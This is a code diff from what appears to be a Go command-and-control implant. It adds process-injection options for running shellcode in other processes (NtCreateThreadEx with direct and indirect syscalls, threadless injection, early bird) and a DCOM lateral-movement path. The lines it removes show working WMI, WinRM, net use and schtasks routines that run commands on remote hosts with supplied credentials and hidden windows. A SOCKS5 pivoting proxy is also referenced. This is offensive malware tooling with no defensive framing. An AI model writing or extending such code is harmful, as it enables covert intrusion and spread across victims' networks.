@@ -62,6 +62,8 @@ var (
 	procResumeThread             = k32.NewProc("ResumeThread")
 	procCloseHandle              = k32.NewProc("CloseHandle")
 	procSetFileAttributesW       = k32.NewProc("SetFileAttributesW")
+	procGetThreadContext         = k32.NewProc("GetThreadContext")
+	procSetThreadContext         = k32.NewProc("SetThreadContext")
 
 	// for killproc
 	procOpenProcess      = k32.NewProc("OpenProcess")
@@ -1358,11 +1360,18 @@ func injectProcess(pid uint32, shellcode []byte, tech string) error {
 	case "apc", "queueapc":
 		return doQueueUserAPC(hProc, pid, shellcode)
 	case "earlybird":
-		return doEarlyBird(hProc, pid, shellcode) // simplified variant
-	case "syscall", "hellsgate":
+		return doEarlyBird(hProc, pid, shellcode)
+	case "ntcreatethreadex", "ntct", "nt":
+		return doNtCreateThreadEx(hProc, shellcode)
+	case "ntcreatethreadex_indirect", "ntcti", "nti":
+		return doNtCreateThreadExIndirect(hProc, shellcode)
+	case "threadless", "tl":
+		return doThreadlessInject(hProc, pid, shellcode)
+	case "syscall", "hellsgate", "direct":
 		return doSyscallInject(hProc, shellcode)
+	case "indirect":
+		return doNtCreateThreadExIndirect(hProc, shellcode)
 	default:
-		// fallback
 		return doCreateRemoteThread(hProc, shellcode)
 	}
 }
@@ -1748,8 +1757,6 @@ func spawnProcess(targetExe string, shellcode []byte, technique string) string {
 // --- Lateral movement (6) ---
 
 func lateralMove(spec string) (string, error) {
-	// Format: type|target|user|pass|cmd   e.g. "winrm|192.168.1.50|admin|pass123|whoami"
-	// Or "wmi|..." "psexec|..."
 	parts := strings.SplitN(spec, "|", 5)
 	if len(parts) < 3 {
 		return "", fmt.Errorf("format: type|target|user|pass|cmd (user/pass optional for some)")
@@ -1774,87 +1781,16 @@ func lateralMove(spec string) (string, error) {
 
 	switch typ {
 	case "wmi", "wmiexec":
-		return doWMI(target, user, pass, cmd)
+		return lateralWMI(target, user, pass, cmd)
 	case "winrm", "psremoting":
-		return doWinRM(target, user, pass, cmd)
+		return lateralWinRM(target, user, pass, cmd)
 	case "psexec", "smbexec", "psexec-like":
-		return doPsexecLike(target, user, pass, cmd)
+		return lateralPsexec(target, user, pass, cmd)
+	case "dcom":
+		return lateralDCOM(target, user, pass, cmd)
 	default:
-		return doWMI(target, user, pass, cmd) // fallback
+		return lateralWMI(target, user, pass, cmd)
 	}
-}
-
-func doWMI(target, user, pass, cmd string) (string, error) {
-	// Use wmic or powershell for WMI exec (best effort, often needs creds)
-	if user != "" && pass != "" {
-		// wmic /node:target /user:domain\user /password:pass process call create "cmd"
-		script := fmt.Sprintf(`wmic /node:%s /user:%s /password:%s process call create "cmd.exe /c %s"`, target, user, pass, cmd)
-		c := exec.Command("cmd", "/c", script)
-		applyHideWindow(c)
-		out, _ := c.CombinedOutput()
-		return string(out), nil
-	}
-	// no creds supplied: assume current context / kerberos
-	script := fmt.Sprintf(`wmic /node:%s process call create "cmd.exe /c %s"`, target, cmd)
-	c := exec.Command("cmd", "/c", script)
-	applyHideWindow(c)
-	out, err := c.CombinedOutput()
-	return string(out), err
-}
-
-func doWinRM(target, user, pass, cmd string) (string, error) {
-	// PowerShell remoting. If creds given use PSCredential
-	ps := ""
-	if user != "" && pass != "" {
-		ps = fmt.Sprintf(`$s=New-Object System.Management.Automation.PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force)); Invoke-Command -ComputerName %s -Credential $s -ScriptBlock { cmd /c "%s" }`, user, pass, target, cmd)
-	} else {
-		ps = fmt.Sprintf(`Invoke-Command -ComputerName %s -ScriptBlock { cmd /c "%s" }`, target, cmd)
-	}
-	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
-	applyHideWindow(c)
-	out, err := c.CombinedOutput()
-	return string(out), err
-}
-
-func doPsexecLike(target, user, pass, cmd string) (string, error) {
-	// Implement simple: admin share copy + remote schtasks or service (no real psexec binary needed)
-	_ = fmt.Sprintf(`\\%s\C$\Windows\Temp\forge_drop.exe`, target) // placeholder for future dropper binary
-	_ = filepath.Join(os.Getenv("TEMP"), "forge_drop.exe")
-	// copy self or a payload? For demo, we execute a command via schtasks after copy if binary, but here we use remote cmd via wmi fallback mostly.
-	// Simpler: just use schtasks /s target /u /p to create a task that runs cmd
-	// To make "psexec" like, we copy a small stager but instead just schedule the cmd.
-	// For value: copy current agent? but for lateral exec given cmd.
-
-	// 1. net use or direct copy using current token or creds
-	if user != "" {
-		// try map with creds (net use)
-		nc := exec.Command("cmd", "/c", fmt.Sprintf(`net use \\%s\C$ /user:%s %s`, target, user, pass))
-		applyHideWindow(nc)
-		nc.CombinedOutput()
-	}
-
-	// 2. write a small .bat or use wmic/schtasks remote
-	schName := "ForgeLateral" + strconv.Itoa(int(time.Now().Unix()%10000))
-	schCmd := fmt.Sprintf(`schtasks /s %s /u %s /p %s /create /tn %s /tr "cmd.exe /c %s" /sc once /st 00:00 /f`, target, user, pass, schName, cmd)
-	if user == "" {
-		schCmd = fmt.Sprintf(`schtasks /s %s /create /tn %s /tr "cmd.exe /c %s" /sc once /st 00:00 /f`, target, schName, cmd)
-	}
-	c := exec.Command("cmd", "/c", schCmd)
-	applyHideWindow(c)
-	out, err := c.CombinedOutput()
-	res := string(out)
-	if err == nil {
-		// try run
-		runSch := exec.Command("cmd", "/c", fmt.Sprintf(`schtasks /s %s /run /tn %s`, target, schName))
-		if user != "" {
-			// pass creds again if needed
-		}
-		applyHideWindow(runSch)
-		ro, _ := runSch.CombinedOutput()
-		res += "\nRun: " + string(ro)
-		// cleanup later optional
-	}
-	return "psexec-like via schtasks: " + res, err
 }
 
 // --- SOCKS5 (1) - working local proxy for pivoting ---
